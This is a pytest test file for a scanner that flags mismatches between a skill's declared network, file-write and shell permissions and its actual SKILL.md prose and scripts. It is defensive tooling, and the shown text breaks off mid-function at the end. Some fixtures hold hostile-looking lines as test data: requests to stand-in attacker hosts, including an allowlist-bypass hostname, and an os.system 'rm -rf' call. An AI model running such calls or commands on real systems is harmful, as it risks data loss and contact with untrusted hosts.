"""Tests for the executionRequirements companion drift scanner
(skills/evaluating-skill-quality/scripts/gitapex_scan_execution_requirements_drift.py,
issue #1022). Co-located with the scanner itself, mirroring
skills/evaluating-skill-quality/scripts/test_gitapex_check_skill_shape.py's
own placement next to gitapex_check_skill_shape.py.

Fixture-based: each ACM-named mismatch shape (disabled-but-networked,
allowlist-but-out-of-list-host, unrestricted-but-no-network-use, and the
tools.write/tools.shell under/over-declaration pairs) gets its own test
against a minimal on-disk skill directory built under tmp_path, plus a
clean-pass counterpart proving the scanner does not fire on matching
declarations. Two dedicated regression sections pin correctness bugs two
independent review rounds found and that were fixed before merge: four
bugs from an adversarial review, and a second, larger round (an allowlist
bypass via hostname truncation, alias-resolution gaps, a missing
RecursionError guard, a silent read-error swallow, and misattributed
test-file/docstring content, among others) from a multi-angle /code-review
pass -- see each new test's own docstring for the specific failure
scenario it pins. The final test is a real-repository *smoke* test only --
find_drift() must run without raising against the real skills/ tree, but
its result is deliberately NOT asserted to be empty: issue #1022's own
Non-goals excludes retroactively auditing every existing skill for a
pre-existing mismatch, and a live check found several already exist (e.g.
planning-a-branch-from-an-issue declares shell: [] but its own Step 8
invokes `python3 scripts/gitapex_check_acm_present.py`). This mirrors
gitapex_check_skill_shape.py's own un-registered status: neither carries a
.gitapex/ssot.json gate entry of its own; each is run deliberately against
one target skill at a time as part of evaluating-skill-quality's own
"Deterministic shape" lane, not as an automatic repo-wide CI gate.
"""

from __future__ import annotations

import ast
import builtins
import importlib
import pathlib
import runpy
import sys

import gitapex_scan_execution_requirements_drift as scanner
import pytest


def _make_skill(
    tmp_path: pathlib.Path,
    *,
    name: str = "example-skill",
    skill_md: str = "# Example Skill\n\n## Steps\n\n1. Read the input.\n",
    scripts: dict[str, str] | None = None,
) -> pathlib.Path:
    skill_dir = tmp_path / name
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text(skill_md, encoding="utf-8")
    if scripts:
        scripts_dir = skill_dir / "scripts"
        scripts_dir.mkdir()
        for filename, content in scripts.items():
            (scripts_dir / filename).write_text(content, encoding="utf-8")
    return skill_dir


def _severities(findings: list[scanner.Finding]) -> list[str]:
    return [f.severity for f in findings]


# ---- find_network_drift ----


def test_disabled_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import urllib.request\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-mode-vs-script-content" in findings[0].message


def test_absent_network_block_but_networked_script_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_network_drift(None, skill_dir)
    assert _severities(findings) == ["error"]


def test_disabled_and_no_network_use_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_allowlist_with_in_list_host_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import urllib.request\nurllib.request.urlopen("https://github.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_allowlist_with_out_of_list_host_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "evil.example.com" in findings[0].message


def test_unrestricted_with_use_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import httpx\n"})
    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []


def test_unrestricted_but_no_use_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "over-declared" in findings[0].message


def test_no_scripts_directory_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


# ---- find_tools_drift ----


def test_write_under_declared_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "tools-write-vs-skill-md" in findings[0].message


def test_write_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_write_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-write-over-declared" in findings[0].message
    assert "over-declared" in findings[0].message


def test_shell_under_declared_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "tools-shell-vs-skill-md" in findings[0].message


def test_shell_declared_and_matches_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Run `git commit` to record the change.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert findings == []


def test_shell_declared_but_no_match_is_warning(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-shell-over-declared" in findings[0].message


def test_fully_clean_skill_has_no_tools_findings(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []


def test_missing_skill_md_does_not_crash(tmp_path: pathlib.Path) -> None:
    skill_dir = tmp_path / "no-skill-md"
    skill_dir.mkdir()
    assert scanner.find_tools_drift({"write": [], "shell": []}, skill_dir) == []


# ---- find_tools_drift: script-content signal (AST-based) ----


def test_write_under_declared_via_open_write_mode(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", "w").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_open_write_mode_keyword(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("out.txt", mode="a").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_read_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", "r").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_default_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_open_with_unrelated_keyword_and_no_mode_is_not_a_write_signal(tmp_path: pathlib.Path) -> None:
    """A keyword-only call with no "mode" keyword at all (e.g. only
    encoding=) must walk past every keyword without matching, not crash
    or false-positive."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'open("in.txt", encoding="utf-8").close()\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_os_remove(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_under_declared_via_pathlib_write_text(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-write-vs-script-content" in f.message for f in findings)


def test_write_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import os\nos.remove("out.txt")\n'})
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_shell_under_declared_via_subprocess_run(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_under_declared_via_aliased_subprocess_import(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import subprocess as sp\nsp.run(["git", "status"])\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_under_declared_via_from_subprocess_import(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'from subprocess import run\nrun(["git", "status"])\n'},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert any("tools-shell-vs-script-content" in f.message for f in findings)


def test_shell_declared_and_matches_script_content_is_clean(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": 'import subprocess\nsubprocess.run(["git", "status"])\n'})
    findings = scanner.find_tools_drift({"write": [], "shell": ["git"]}, skill_dir)
    assert findings == []


def test_unrelated_dot_run_method_is_not_a_shell_signal(tmp_path: pathlib.Path) -> None:
    """A bare method name match on ".run(" would be a severe false-positive
    source: "run" is an extremely common method name on unrelated objects
    (a test runner, a workflow class). Only a call resolved back to a real
    subprocess/os import counts."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": "class Workflow:\n    def run(self):\n        pass\n\nWorkflow().run()\n"},
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert not any("tools-shell-vs-script-content" in f.message for f in findings)


def test_over_declared_is_joint_not_per_source(tmp_path: pathlib.Path) -> None:
    """Over-declaration must not fire just because ONE source shows no
    evidence -- a skill can validly declare tools.write purely because its
    own SKILL.md prose instructs the agent to write files, with zero
    bundled scripts ever doing so directly. Only "neither source shows
    evidence" is real over-declaration."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"helper.py": "import pathlib\n"},
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert findings == []


def test_over_declared_fires_when_neither_source_has_evidence(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Read the input.\n",
        scripts={"helper.py": "import pathlib\n"},
    )
    findings = scanner.find_tools_drift({"write": ["files"], "shell": []}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert "tools-write-over-declared" in findings[0].message


# ---- regression tests for bugs found by an independent adversarial review
# of this module (fixed before merge; each test pins the fix) ----


def test_shell_backtick_alternatives_match_without_a_preceding_run(tmp_path: pathlib.Path) -> None:
    """The real-world case the module docstring cites as motivation: a
    prior version of _SHELL_INTENT_PATTERN wrapped every alternative,
    including four starting with a literal backtick, in one leading \\b --
    but \\b demands a word/non-word transition, and a backtick is itself
    non-word, so those four alternatives could never match in ordinary
    Markdown (a backtick preceded by whitespace/punctuation). Only the
    generic ``run\\s+```` alternative worked, silently masking the bug --
    every case below previously returned no match."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Its own Step 8 invokes `python3 scripts/gitapex_check_acm_present.py`.\n",
    )
    findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
    assert _severities(findings) == ["error"]

    for phrase in (
        'Then invoke `git commit -m "x"` to save.',
        "Use `uv run pytest` here.",
        "Finish with `git push` to publish.",
        "Run `npm install` first.",
    ):
        assert scanner._SHELL_INTENT_PATTERN.search(phrase), f"should match: {phrase!r}"


def test_write_nouns_do_not_match_as_a_bare_prefix(tmp_path: pathlib.Path) -> None:
    """A prior version of _WRITE_NOUNS left several alternatives (file,
    script, branch, commit, document, ...) with no trailing \\b, so they
    matched as a bare prefix of an unrelated word right after them --
    "creates a review committee" matched via "commit", "creates a
    scripting-friendly interface" matched via "script". Neither sentence
    has anything to do with writing a file; both must produce zero
    findings when tools.write is correctly declared empty."""
    cases = {
        "committee-case": "# Example\n\n## Steps\n\n1. This skill creates a review committee for the launch.\n",
        "scripting-case": "# Example\n\n## Steps\n\n1. This skill creates a scripting-friendly interface for review.\n",
    }
    for name, skill_md in cases.items():
        skill_dir = _make_skill(tmp_path, name=name, skill_md=skill_md)
        findings = scanner.find_tools_drift({"write": [], "shell": []}, skill_dir)
        assert findings == [], f"false positive for: {skill_md!r}"


def test_null_network_mode_still_fails_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
    """A prior version used ``network.get("mode", "disabled")``, which only
    substitutes the default when the key is ABSENT -- a real ``mode: null``
    (valid YAML) or a mis-cased/typo'd mode string (e.g. "Disabled") passed
    straight through as the effective mode, matched none of the three
    recognized-mode branches, and silently returned no findings even
    against a script making real, unrestricted network calls. Any
    unrecognized mode value must now fall back to the strictest treatment
    ("disabled") and still flag real usage."""
    skill_dir = _make_skill(
        tmp_path, scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com")\n'}
    )
    for network in ({"mode": None}, {"mode": "Disabled"}, {"mode": "off"}):
        findings = scanner.find_network_drift(network, skill_dir)
        assert _severities(findings) == ["error"], f"should fail closed for network={network!r}"


def test_allowlist_host_comparison_is_case_insensitive(tmp_path: pathlib.Path) -> None:
    """Hostnames are case-insensitive (RFC 4343); a prior version compared
    the literal-cased extracted host against the literal-cased declared
    domains, so a script referencing "https://GitHub.com/x" against a
    correctly declared ``domains: [github.com]`` produced a false-positive
    error finding."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://GitHub.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_urllib_parse_alone_is_not_network_capable(tmp_path: pathlib.Path) -> None:
    """A prior version listed bare "urllib" in NETWORK_CAPABLE_MODULES, so
    the trailing (?:\\.\\w+)* suffix let "import urllib.parse" match too --
    but urllib.parse performs no network I/O of its own. A skill declaring
    network.mode: disabled that only imports urllib.parse for pure URL
    parsing must not be flagged."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import urllib.parse\n"})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_from_urllib_import_request_is_now_caught(tmp_path: pathlib.Path) -> None:
    """The old regex-based scanner disclosed "from urllib import request"
    as an unfixed false negative, since it anchored on the dotted module
    path after import/from and could not see that "request" here names
    the network-capable urllib.request submodule. AST-based import
    resolution closes this: _tree_has_network_import checks both the
    ImportFrom node's own module ("urllib") and each imported name
    joined onto it ("urllib.request")."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "from urllib import request\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]


def test_unparseable_script_is_flagged_not_silently_skipped(tmp_path: pathlib.Path) -> None:
    """A bundled .py file that is not valid Python (a real SyntaxError)
    must not be silently excluded from analysis and treated as clean --
    dimension 15's fail-closed default. find_network_drift reports it as
    its own undetermined finding rather than either crashing or passing
    the skill vacuously."""
    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "def f(:\n    pass\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-script-unparseable" in findings[0].message
    assert "broken.py" in findings[0].message


def test_commented_out_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
    """_URL_HOST_PATTERN previously scanned raw script text including
    comment lines, so a doc reference like "# see https://docs.python.org/"
    was treated as executed network usage."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": "# see https://docs.python.org/3/library/re.html\nimport pathlib\n"},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir) == []


# ---- regression tests for the second independent-review round (code-review) ----


def test_allowlist_host_with_underscore_is_not_truncated_to_a_false_match(tmp_path: pathlib.Path) -> None:
    """A prior version's _URL_HOST_PATTERN excluded underscore from its
    hostname character class, so "https://internal_evilhost.attacker.com"
    matched only up to "internal" -- an allowlisted-looking prefix that
    silently passed the allowlist check while the real host
    (attacker.com) was never compared at all. urllib.parse.urlsplit-based
    extraction must capture the real host in full."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": 'import requests\nrequests.get("https://internal_evilhost.attacker.com/x")\n'},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["internal"]}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "internal_evilhost.attacker.com" in findings[0].message


def test_url_literal_without_a_host_contributes_no_referenced_host(tmp_path: pathlib.Path) -> None:
    """A URL literal that urllib.parse.urlsplit resolves to an empty
    hostname (e.g. "https:///path", no authority component) must not
    contribute a spurious host to the referenced-hosts set."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": 'x = "https:///path"\n'})
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_docstring_url_does_not_count_as_network_usage(tmp_path: pathlib.Path) -> None:
    """A URL inside a module docstring is documentation/citation text, not
    a network call -- the same "not code" status a comment already has,
    but ast.Constant does not distinguish a docstring from an ordinary
    string literal by content alone. _docstring_constant_ids excludes it
    by body position instead (found live: this exact shape false-positives
    against this repository's own evaluating-deterministic-gate-quality
    skill today)."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": '"""See https://docs.python.org/3/library/re.html for details."""\nimport pathlib\n'},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_module_alias_shadowing_across_scopes_does_not_hide_a_real_call(tmp_path: pathlib.Path) -> None:
    """_module_aliases previously kept one flat dict overwritten in import
    order, not scope order: a later "import os as sp" in an unrelated
    function silently erased an earlier "import subprocess as sp" alias,
    so the real subprocess.run(...) call resolved to the non-existent
    "os.run" and went undetected."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "helper.py": (
                "def helper():\n"
                "    import subprocess as sp\n"
                '    sp.run(["ls", "-la"])\n'
                "\n"
                "def other():\n"
                "    import os as sp\n"
                "    sp.getcwd()\n"
            )
        },
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_import_os_path_submodule_form_is_recognized(tmp_path: pathlib.Path) -> None:
    """A plain, unaliased "import os.path" binds the local name "os" to
    the top-level os module itself (Python's own import semantics), so
    os.system(...) afterward is ordinary, valid code -- but a prior
    version's alias resolution only matched alias.name == "os" exactly,
    missing "os.path" as the dotted import name and so never registering
    the alias at all."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": 'import os.path\nos.system("rm -rf /tmp/x")\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_write_under_declared_via_pathlib_unlink(tmp_path: pathlib.Path) -> None:
    """_PATH_WRITE_METHOD_NAMES previously covered only write_text/
    write_bytes out of pathlib.Path's own mutating-method surface --
    .unlink() (deleting a file) is just as real a write as those two."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"cleanup.py": 'import pathlib\npathlib.Path("out.txt").unlink()\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-write-vs-script-content" in ids


def test_shell_under_declared_via_os_posix_spawn(tmp_path: pathlib.Path) -> None:
    """os.posix_spawn is the modern stdlib replacement subprocess itself
    now uses internally on POSIX -- a prior version enumerated the older
    os.spawn* family exhaustively but omitted it."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"launch.py": 'import os\nos.posix_spawn("/bin/ls", ["/bin/ls"], {})\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    ids = [f.message.split(":")[0] for f in findings]
    assert "tools-shell-vs-script-content" in ids


def test_unreadable_script_is_flagged_undetermined_not_silently_clean(tmp_path: pathlib.Path) -> None:
    """A bundled script that exists but is not valid UTF-8 must not be
    silently treated as an empty (and therefore clean) module -- a prior
    version routed the read through a helper that swallowed
    OSError/UnicodeDecodeError into "", which ast.parse("") accepts as a
    valid empty tree, scoring a genuinely unreadable script (which could
    contain real network/write/shell code) as having zero signal --
    contradicting this module's own stated dimension-15 principle: an
    inability to verify is a deny, not an assume-clean."""
    skill_dir = _make_skill(tmp_path, scripts={"broken.py": "placeholder"})
    (skill_dir / "scripts" / "broken.py").write_bytes(b"\xff\xfe not utf-8")
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert _severities(findings) == ["error"]
    assert "network-script-unparseable" in findings[0].message
    assert "broken.py" in findings[0].message


def test_bundled_test_file_is_excluded_from_script_content_scanning(tmp_path: pathlib.Path) -> None:
    """A skill's own unit-test file legitimately exercises test-double
    network calls, mocked subprocess invocations, and similar test-only
    content that is not the skill's own shipped capability -- including it
    in scripts/*.py scanning misattributes that content as real drift
    (found live against this repository's own setup-gitapex-toolchain and
    drafting-an-adr skills, each reporting a finding whose only real
    source was its own test file)."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "real.py": "import pathlib\n",
            "test_real.py": 'import requests\nrequests.get("https://example.test/x")\n',
        },
    )
    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_deterministic_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, scripts={"fetch.py": "import requests\n"})
    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)
    assert findings and all(f.kind == "deterministic" for f in findings)


def test_skill_md_prose_findings_carry_heuristic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example Skill\n\n## Steps\n\n1. Write the output file.\n",
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    kinds = {f.message.split(":")[0]: f.kind for f in findings}
    assert kinds["tools-write-vs-skill-md"] == "heuristic"


def test_script_content_findings_carry_deterministic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        scripts={"helper.py": 'import pathlib\npathlib.Path("out.txt").write_text("x")\n'},
    )
    findings = scanner.find_tools_drift({}, skill_dir)
    kinds = {f.message.split(":")[0]: f.kind for f in findings}
    assert kinds["tools-write-vs-script-content"] == "deterministic"


def test_over_declared_finding_carries_heuristic_kind(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    findings = scanner.find_tools_drift({"write": ["approved"]}, skill_dir)
    assert _severities(findings) == ["warning"]
    assert findings[0].kind == "heuristic"


def test_find_skill_drift_parses_bundled_scripts_only_once(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """find_skill_drift computes _bundled_script_trees once and passes the
    result to both find_network_drift and find_tools_drift, instead of
    each independently re-reading and re-parsing every bundled script --
    a prior version parsed every script twice per skill scan."""
    skill_dir = _make_skill(tmp_path, scripts={"helper.py": "import pathlib\n"})
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
    call_count = 0
    real = scanner._bundled_script_trees

    def counting(skill_dir: pathlib.Path) -> tuple[list[ast.AST], list[str]]:
        nonlocal call_count
        call_count += 1
        return real(skill_dir)

    monkeypatch.setattr(scanner, "_bundled_script_trees", counting)
    scanner.find_skill_drift(skill_dir)
    assert call_count == 1


# ---- find_drift (integration) ----


def _write_sidecar(skill_dir: pathlib.Path, execution_requirements: dict[str, object]) -> None:
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements:\n"
        f"    network:\n      mode: {execution_requirements.get('network_mode', 'disabled')}\n"
        f"    tools:\n"
        f"      write: {execution_requirements.get('write_tags', [])}\n"
        f"      shell: {execution_requirements.get('shell_tags', [])}\n",
        encoding="utf-8",
    )


def test_find_drift_wires_network_and_tools_checks_end_to_end(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m and m.startswith("example-skill:") for m in messages)
    assert any("tools-write-vs-skill-md" in m and m.startswith("example-skill:") for m in messages)


def test_find_drift_below_floor_is_error(tmp_path: pathlib.Path) -> None:
    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=5)
    assert _severities(findings) == ["error"]
    assert "skill-discovery-floor" in findings[0].message


def test_find_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    _make_skill(tmp_path)
    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
    assert _severities(findings) == ["error"]
    assert "metadata-file-present" in findings[0].message


# ---- find_skill_drift (single-target, the CLI's own entry point) ----


def test_find_skill_drift_wires_network_and_tools_checks(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    findings = scanner.find_skill_drift(skill_dir)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m for m in messages)
    assert any("tools-write-vs-skill-md" in m for m in messages)
    # Unlike find_drift(), messages carry no skill-name prefix -- single-target use.
    assert not any(m.startswith("example-skill:") for m in messages)


def test_find_skill_drift_missing_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    findings = scanner.find_skill_drift(skill_dir)
    assert _severities(findings) == ["error"]
    assert "metadata-file-present" in findings[0].message


def test_find_skill_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")

    findings = scanner.find_skill_drift(skill_dir)

    assert _severities(findings) == ["error"]
    assert "not valid YAML" in findings[0].message


def test_find_skill_drift_clean_skill_has_no_findings(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
    assert scanner.find_skill_drift(skill_dir) == []


# ---- main() CLI ----


def test_main_requires_a_target_argument() -> None:
    with pytest.raises(SystemExit):
        scanner.main([])


def test_main_nonexistent_target_fails_loudly(capsys: pytest.CaptureFixture[str]) -> None:
    exit_code = scanner.main(["some/nonexistent/skill/dir"])
    assert exit_code == 1
    assert "is not a skill directory" in capsys.readouterr().out


def test_main_clean_tree_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(scanner, "find_skill_drift", lambda skill_dir: [])
    assert scanner.main([str(tmp_path)]) == 0


def test_main_warning_only_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        scanner,
        "find_skill_drift",
        lambda skill_dir: [scanner.Finding("warning", "heuristic", "some over-declaration")],
    )
    assert scanner.main([str(tmp_path)]) == 0


def test_main_error_exits_one(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        scanner,
        "find_skill_drift",
        lambda skill_dir: [scanner.Finding("error", "deterministic", "some under-declaration")],
    )
    assert scanner.main([str(tmp_path)]) == 1


def test_main_end_to_end_against_a_real_skill_dir_no_mocking(
